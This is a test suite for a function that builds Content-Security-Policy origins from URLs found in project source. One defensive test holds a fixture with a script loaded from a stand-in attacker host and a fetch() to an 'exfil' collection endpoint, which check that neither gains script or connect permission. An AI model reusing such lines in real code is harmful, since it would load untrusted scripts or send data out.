import "#veryfront/schemas/_test-setup.ts";
import { describe, it } from "#veryfront/testing/bdd.ts";
import { assert, assertEquals } from "#veryfront/testing/assert.ts";
import { DERIVABLE_CSP_DIRECTIVES, deriveCspOriginsFromSource } from "./derived-csp-origins.ts";

function origins(content: string, path = "pages/index.mdx"): readonly string[] {
  const derived = deriveCspOriginsFromSource([{ path, content }]);
  return derived["img-src"] ?? [];
}

describe("security/http/derived-csp-origins", () => {
  describe("the syntaxes real content actually uses", () => {
    // Every case here is a shape taken from a hosted project's released source.
    // Matching by position -- <img src>, url(), poster -- recovered about a
    // third of them, which is why this matches URLs wherever they appear.

    it("an html or jsx src attribute", () => {
      assertEquals(
        origins(`<img src="https://cdn.example.com/uploads/a.png" />`),
        ["https://cdn.example.com"],
      );
    });

    it("a jsx prop that is not named src", () => {
      assertEquals(
        origins(`imageSrc: 'https://cdn.example.com/uploads/b.png'`),
        ["https://cdn.example.com"],
      );
      assertEquals(
        origins(`srcFallback: "https://cdn.example.com/video/720p.mp4"`),
        ["https://cdn.example.com"],
      );
    });

    it("yaml frontmatter", () => {
      assertEquals(
        origins(`---\ntitle: Post\nimage: "https://cdn.example.com/i/hero.png"\n---`),
        ["https://cdn.example.com"],
      );
    });

    it("markdown image syntax", () => {
      assertEquals(
        origins(`![Kiali dashboard](https://cdn.example.com/uploads/kiali.png)`),
        ["https://cdn.example.com"],
      );
    });

    it("a bare url on its own line, as in a props array", () => {
      assertEquals(
        origins(`  https://cdn.example.com/video/hls/intro/manifest.m3u8`),
        ["https://cdn.example.com"],
      );
    });

    it("an href, as on a favicon link", () => {
      assertEquals(
        origins(`<link rel="icon" href="https://cdn.example.com/favicon.ico" />`),
        ["https://cdn.example.com"],
      );
    });

    it("a css url()", () => {
      assertEquals(
        origins(`.hero { background-image: url(https://cdn.example.com/bg.png); }`, "globals.css"),
        ["https://cdn.example.com"],
      );
    });
  });

  describe("what it produces", () => {
    it("grants every origin to all three passive directives", () => {
      // Routing between img/media/font by file extension would reintroduce a
      // failure mode -- guess wrong and the asset stays blocked -- while an
      // origin allowed for images but not media is not a boundary anyone
      // reasons about.
      const derived = deriveCspOriginsFromSource([
        { path: "a.mdx", content: `<img src="https://cdn.example.com/a.png" />` },
      ]);
      assertEquals(Object.keys(derived).sort(), ["font-src", "img-src", "media-src"]);
      for (const directive of DERIVABLE_CSP_DIRECTIVES) {
        assertEquals(derived[directive], ["https://cdn.example.com"]);
      }
    });

    it("reduces urls to origins, dropping path and query", () => {
      assertEquals(
        origins(`<img src="https://cdn.example.com/a/b/c.png?w=64#x" />`),
        ["https://cdn.example.com"],
      );
    });

    it("keeps a non-default port, which CSP treats as part of the origin", () => {
      assertEquals(
        origins(`<img src="https://assets.example.com:8443/a.png" />`),
        ["https://assets.example.com:8443"],
      );
    });

    it("deduplicates and sorts, so the header is stable across builds", () => {
      // An unstable order would churn the served header and anything keyed on it.
      assertEquals(
        origins(`https://b.example.com/1 https://a.example.com/2 https://b.example.com/3`),
        ["https://a.example.com", "https://b.example.com"],
      );
    });

    it("reads across files and tolerates contentless entries", () => {
      const derived = deriveCspOriginsFromSource([
        { path: "a.mdx", content: `https://a.example.com/x` },
        { path: "b.mdx", content: `https://b.example.com/y` },
        { path: "c.bin" },
      ]);
      assertEquals(derived["img-src"], ["https://a.example.com", "https://b.example.com"]);
    });
  });

  describe("the line it will not cross", () => {
    it("never contributes to script-src or connect-src", () => {
      // The whole safety argument. A source mention must not become permission
      // to execute code or to receive exfiltrated data, or influencing source
      // would imply granting both.
      const derived = deriveCspOriginsFromSource([{
        path: "p.tsx",
        content: `<script src="https://evil.example.com/x.js"></script>
                  fetch("https://exfil.example.com/collect")`,
      }]);
      assertEquals(Object.keys(derived).sort(), ["font-src", "img-src", "media-src"]);
      assertEquals(derived["script-src" as never], undefined);
      assertEquals(derived["connect-src" as never], undefined);
    });

    it("grants a script host passive access only, never execution", () => {
      // A host referenced from a <script> tag is still discovered -- the scan
      // is syntax-blind -- but it can only ever land in the passive set.
      const derived = deriveCspOriginsFromSource([{
        path: "p.tsx",
        content: `<script src="https://cdn.example.com/x.js"></script>`,
      }]);
      assertEquals(derived["img-src"], ["https://cdn.example.com"]);
      assertEquals(Object.keys(derived).length, DERIVABLE_CSP_DIRECTIVES.length);
    });

    it("ignores http origins", () => {
      // Plaintext in a policy served over https invites mixed content the
      // browser blocks anyway.
      assertEquals(origins(`<img src="http://insecure.example.com/x.png" />`), []);
    });

    it("ignores relative and protocol-relative references", () => {
      assertEquals(origins(`<img src="/local.png" /><img src="//cdn.example.com/x" />`), []);
    });

    it("ignores wildcards and bare hostnames", () => {
      // An unfilled template and a non-public label; neither belongs in a
      // served policy.
      assertEquals(origins(`https://*.example.com/x https://localhost/y`), []);
    });

    it("cannot see a runtime-assembled url", () => {
      // The documented boundary, not a wish: these projects still declare
      // security.csp, which is what "override" means.
      assertEquals(origins("<img src={`https://${host}/x.png`} />"), []);
    });

    it("produces nothing for source with no external references", () => {
      assertEquals(deriveCspOriginsFromSource([{ path: "p.tsx", content: "<div>hi</div>" }]), {});
      assertEquals(deriveCspOriginsFromSource([]), {});
    });
  });

  describe("bounds", () => {
    it("caps how many origins one project can contribute", () => {
      const many = Array.from({ length: 100 }, (_, i) => `https://h${i}.example.com/x`).join("\n");
      assertEquals(origins(many).length, 32);
    });

    it("keeps the most-referenced origins when the cap bites", () => {
      // The failure this prevents: on a content site, one-off prose links
      // vastly outnumber asset hosts, so an arbitrary cut can drop the CDN the
      // site actually depends on. An asset host recurs on every page that uses
      // it; a link in body copy appears once.
      const linkNoise = Array.from(
        { length: 60 },
        (_, i) => `[ref](https://link${i}.example.com/a)`,
      ).join("\n");
      const assetHost = Array.from(
        { length: 5 },
        () => `<img src="https://cdn.example.com/a.png" />`,
      ).join("\n");
      const derived = origins(`${linkNoise}\n${assetHost}`);
      assertEquals(derived.length, 32);
      // Exact membership, never substring containment: matching
      // "https://cdn.example.com" inside a joined list would also pass for a
      // hostile "https://cdn.example.com.evil.test". Same reason
      // security-handler.test.ts asserts through a Set.
      assert(
        new Set(derived).has("https://cdn.example.com"),
        "the recurring asset host must survive the cap",
      );
    });

    it("orders deterministically for a given release", () => {
      // The result is cached per release and shapes a served header, so equal
      // input must produce byte-identical output.
      const content = `https://b.example.com/1 https://a.example.com/2 https://a.example.com/3`;
      assertEquals(origins(content), origins(content));
      assertEquals(origins(content), ["https://a.example.com", "https://b.example.com"]);
    });

    it("scans only the head of a very large file", () => {
      const filler = "x".repeat(600 * 1024);
      assertEquals(origins(`${filler}https://late.example.com/x`), []);
    });

    it("bounds multibyte content by the same character budget", () => {
      // The budget is code units, not UTF-8 bytes: that is the unit the regex
      // engine steps through, so the scanning cost is identical either way.
      // A byte-denominated cap would read more naturally but would not track
      // the cost it exists to bound.
      const under = "€".repeat(400 * 1024);
      assertEquals(origins(`${under}https://early.example.com/x`), [
        "https://early.example.com",
      ]);
      const over = "€".repeat(600 * 1024);
      assertEquals(origins(`${over}https://late.example.com/x`), []);
    });

    it("freezes its result", () => {
      // Cached per release and shared across requests, so one consumer must not
      // be able to mutate another request's view of it.
      const derived = deriveCspOriginsFromSource([{
        path: "p",
        content: "https://a.example.com/x",
      }]);
      assert(Object.isFrozen(derived));
      assert(Object.isFrozen(derived["img-src"]));
    });
  });
});
